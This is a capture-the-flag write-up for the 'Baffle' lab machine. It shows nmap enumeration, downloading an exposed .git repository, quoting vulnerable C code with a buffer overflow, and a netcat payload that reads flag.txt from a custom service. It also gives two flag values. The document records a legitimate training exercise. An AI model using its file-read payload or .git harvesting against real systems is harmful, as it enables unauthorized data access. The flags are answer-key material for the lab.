# DC416: Baffle

# Enumeration

## Nmap

```bash
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 34:b3:3e:f7:50:91:51:6f:0b:e2:35:7b:d1:34:a1:eb (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOTfd+5cemlCl1B6wf1txlU7pxYyYxj31L6h1v3vcWgxYqLhZpxKKeQ9gqc66yivLX7Vbn7FuABJBMNI53+oRGwzeQ0se3K4/ldaCdn7XvE/y2lmw5lnsXhVls0PvPjB0BkgIgba/2jcBa/3ZJoO9s812YERGGz7GA9udWdJzCL9AAAAFQCMxukrorSf6Sxq6tGKcVldcN3qzwAAAIEAr6elaNCqmydPGwnpnk8fFSP24uvWWLIHp2OCAve+v1KBv1YPsdQ5sxWFsYMQMONiLklGo22OIcgAw+W/rZvy5nSV5yr39luK3xzcXLUYmsBUT97+Eo0+dqY5jHjjMCqqC4akwvsNzWAIP3C0PlL2+1sVA8IUE+/qKmLvxguB8qMAAACAX0HrlVVssbu4Pav0S/DWMIS1UBndlzM3c3C5wFmIDMe1UsnTDsn2CvLCKT/WkigLXwN/AkieUkcUMgGi6gHi9NOh7KcixMotvlKg0MjaGsFwDDNQEdRtCae+ZD8k1JW35wMfMJofuH64qh2EmX4Uov7LNAfN5gnUcJo2WBPqJ18=
|   2048 b9:a9:a8:bc:db:7d:77:e4:ae:31:1c:16:4f:3b:8b:de (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVc5JLNu2oPfEMWHSeKPtyoLSQvtEjI7xlr5CXCZSh5KoOp05wwQj0dX26WVczhEvVC+KxpTlz66J+7gaHYqGY5reXsT6MlPtAgOW+t6Tw0lAR3prdKAAlOZrTyhb+e1NF655gSOYSHLmCUaxHbbmSTnyYlx9QkZ7YPJARwUL0OQ6tGSLyKFvoJvEd1/6vUvlf7z4PHPf04Oe3Mv/eF/C+JYIvVFk4LHltpeqlTvsQFDAIST9lAPj7vE26mpI89WoNmHjq2HxLLU2Jj0dk3s2ZCVLPW3EXfCaKEbdW1SAvslRSl6Gz5VHlbM0NlCPONj5vxo0Oj4xgSx9K8SgwP1kr
|   256 88:3f:60:bb:9e:49:53:e3:f7:bb:30:84:7f:a8:f0:17 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK0zVSv1xNkqIWsNlOo8IPsdKSWbxzQyoVztHqCVfr5SNikBtx3kn8OI+xMqrSsPT6pWTJUYH2ChZNlLzRWWu4Y=
|   256 a4:61:7a:0a:a4:d8:6c:a8:10:c3:bd:09:8f:9e:c1:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKp1MqBzLf3OKxKy/i+ZP8/T4Ylx3BmzEaeh/7f2L4+B

80/tcp   open  http     syn-ack ttl 63 nginx 1.6.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: baffle
|_http-server-header: nginx/1.6.2
| http-git: 
|   10.0.1.2:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Trashed my code, but deployed the product anyway. 

6969/tcp open  acmsoda? syn-ack ttl 63
```

## SSH (22)

```bash
┌──(kali㉿kali)-[~]
└─$ ssh root@10.0.1.2                                        
root@10.0.1.2's password: 
```

- Root login and password based authentication enabled.
- Key based authentication recommended.

## HTTP (80)

<img width="848" height="579" alt="image" src="https://github.com/user-attachments/assets/874ee201-6bc9-4ce8-bc49-2b3dce4a2d10" />

### Git Repository

- Our nmap scan had already found a git repository in `/.git/` :

<img width="848" height="573" alt="image" src="https://github.com/user-attachments/assets/dcea5717-2ab6-4956-a3a9-5c50ee64c4b7" />

- First, we need to download the directory so that we can use git commands:

```bash
┌──(kali㉿kali)-[~]
└─$ wget -r --no-parent http://10.0.1.2/.git/
```

- We identified a number of commits in the commit history along with an email address belonging to user `alice`:

```bash
┌──(kali㉿kali)-[~/10.0.1.2]
└─$ git log        
commit 8bde72465957415c12ab6f89ff679f8f9e7c5c7a (HEAD -> master)
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:58:02 2016 -0400

    Trashed my code, but deployed the product anyway.

commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:55:07 2016 -0400

    Some assembly required

commit 9b5c226d15d611d6957f3fda7c993186270a6cc4
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:52:40 2016 -0400

    Made it into a write-type-thing instead

commit 06483346fab91b2b17471074a887ac7dffd9ceda
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:44:25 2016 -0400

    My cat danced on the keyboard

commit 7edc47a1c3e4dc880a7191915bdbf1565c6b7441
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:37:14 2016 -0400

    This coder turned coffee into code. You won't believe how she did it!

commit d7a1f067a2f4ac469bc4cf77c689a34e2286b665
Author: alice <alice@baffle.me>
Date:   Mon Oct 17 14:30:20 2016 -0400

    Hello, friend...
```

- We used `git checkout <HASH>` to extract the files from every commit
- We discovered multiple revisions of a C program `hellofriend.c` and a base64 encoded file `project.enc`

```bash
┌──(kali㉿kali)-[~/10.0.1.2/commit5]
└─$ cat project.enc | base64 -d > project    
                                                                                                                        
┌──(kali㉿kali)-[~/10.0.1.2/commit5]
└─$ file project    
project: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8d8f87535451003b05db15d14d07818576813b49, not stripped
```

- This seems to be a compiled version of `hellofriend.c` , where the program takes user input into a 2000-byte buffer and passes it to a parse_request function designed to handle binary protocol requests for file operations (read/write).
- We found the first flag in commit `06483346fab91b2b17471074a887ac7dffd9ceda` (My cat danced on the keyboard):

```
FLAG{ARSE_REQUEST}
```

- Commits `06483346fab91b2b17471074a887ac7dffd9ceda` and `7edc47a1c3e4dc880a7191915bdbf1565c6b7441` revealed the file read code:

```c
memset(file, 0, sizeof(file));
		    
ptr = (char *)ptr + 2;
file_len = n - 9; 
memcpy(file, ptr, file_len); 
        
fp = fopen(file, "r"); 
        
if (fp) {
			memset(file_content, 0, sizeof(file_content)); 
			fgets(file_content, sizeof(file_content), fp); 
			printf("%s", file_content); 
}
```

- From here we understand that the first 2 bytes of our input will be skipped (`ptr = (char *)ptr + 2;`), presumably for being reserved to specify request type (`\x01` in this case), then the file name/path is obtained by subtracting 9 from the string length, which means we can read files by sending a payload that looks like this: `\x01\x01<FILENAME OR FILEPATH>AAAAAA`
- Commit `9b5c226d15d611d6957f3fda7c993186270a6cc4` revealed some of the file write code:

```c
memset(file, 0, sizeof(file)); 
memset(mode, 0, sizeof(mode)); 

memset(data, 0, sizeof(data)); 
memset(to_write, 0, sizeof(to_write)); 

ptr = (char *)ptr + 2; 
file_len = strlen(ptr); 

ptr = (char *)ptr + file_len + 1;
ptr = (char *)ptr + 6;

memcpy(to_write, ptr, 500); 
memcpy(data, ptr, 2000); 
```

- `memcpy(data, ptr, 2000);` is our vulnerable code here because `char data[500];`  (Massive Overflow)

## Port 6969

- `project.elf` must be running as a service on this port
- We assumed the existence of a `flag.txt` and used our payload from the previous section to attempt to read it, which led us to our 2nd flag!

```bash
┌──(kali㉿kali)-[~/10.0.1.2]
└─$ python3 -c 'print("\x01\x01flag.txtAAAAAA")' | nc 10.0.1.2 6969
FLAG{is_there_an_ivana_tinkle}
```
